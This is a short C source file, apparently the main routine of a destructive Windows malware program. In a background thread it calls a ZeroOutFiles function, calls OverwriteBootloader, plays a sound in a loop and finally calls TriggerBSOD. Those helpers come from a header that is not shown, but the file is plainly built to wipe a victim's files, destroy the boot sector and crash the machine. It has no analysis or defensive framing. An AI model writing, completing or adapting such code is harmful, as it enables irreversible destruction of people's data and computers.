#include "utils.h"

#include <pthread.h>
#include <windows.h>

#define SOUND_PATH "assets/sound.wav"
#define INITIAL_DELAY 500

int main() {
    pthread_t thread;
    pthread_create(&thread, NULL, (void*)ZeroOutFiles, NULL);
    
    OverwriteBootloader();
    
    for (unsigned short delay = INITIAL_DELAY; delay > 0; delay--) {
        PlaySound(SOUND_PATH, NULL, SND_FILENAME | SND_ASYNC);
        Sleep(delay * 1000);
    }

    TriggerBSOD();

    return 1;
}